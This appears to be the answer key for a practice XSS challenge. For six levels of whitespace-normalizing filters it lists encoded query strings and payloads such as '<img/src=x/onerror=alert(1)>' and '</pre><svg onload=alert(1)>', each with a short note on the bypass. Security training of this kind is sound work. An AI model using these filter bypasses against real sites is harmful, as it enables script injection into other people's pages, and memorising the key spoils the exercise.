# whitespace — solutions

Whitespace-normalizing filters; pick delimiters that survive.

### whitespace-level1

`/whitespace/level1/?query=%3Cimg/src=x/onerror=alert(1)%3E`

- payload: `<img/src=x/onerror=alert(1)>`
- context: spaces → `&nbsp;`; use `/` as attribute separator

### whitespace-level2

`/whitespace/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: only tabs stripped; spaces work

### whitespace-level3

`/whitespace/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: only newlines stripped; single-line payload

### whitespace-level4

`/whitespace/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: multi-space collapse — single space works

### whitespace-level5

`/whitespace/level5/?query=%3C/pre%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</pre><svg onload=alert(1)>`
- context: raw inside `<pre>` — close pre then inject

### whitespace-level6

`/whitespace/level6/?query=%3Csvg/onload=alert(1)%3E`

- payload: `<svg/onload=alert(1)>`
- context: all whitespace stripped; `/` as attribute separator
